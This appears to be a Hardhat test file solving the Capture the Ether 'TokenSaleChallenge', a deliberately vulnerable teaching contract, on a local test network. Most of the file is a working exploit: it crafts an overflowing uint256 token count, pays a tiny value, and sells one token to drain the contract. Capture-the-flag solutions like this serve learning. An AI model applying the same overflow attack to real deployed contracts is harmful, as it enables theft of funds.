import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const numTokens = "0x12725dd1d243aba0e75fe645cc4873f9e65afe688c928e1f22";
    const value = "0x5c5e69957480000";

    // Find an integer that overflows uint256
    //     solve (x * 10**18) > 2**256 and  (x * 10**18 < 2**256 + 10**18) where x over integers
    //     x = 115792089237316195423570985008687907853269984665640564039458
    //     (0x12725dd1d243aba0e75fe645cc4873f9e65afe688c928e1f22 in hex)
    //
    // Then send this integer to the buy method, modify the contract to log out the required value.
    // Undo the modifications and use the obtained value when sending the buy transaction.

    const tx = await target.buy(numTokens, { value });
    await tx.wait();

    // Since value sent was less than 1eth, the starting balance is 1 eth and the requirement is for
    // the end balance be under 1 eth it is OK to sell just one token, making the new balance equal `value`
    await (await target.sell(1)).wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
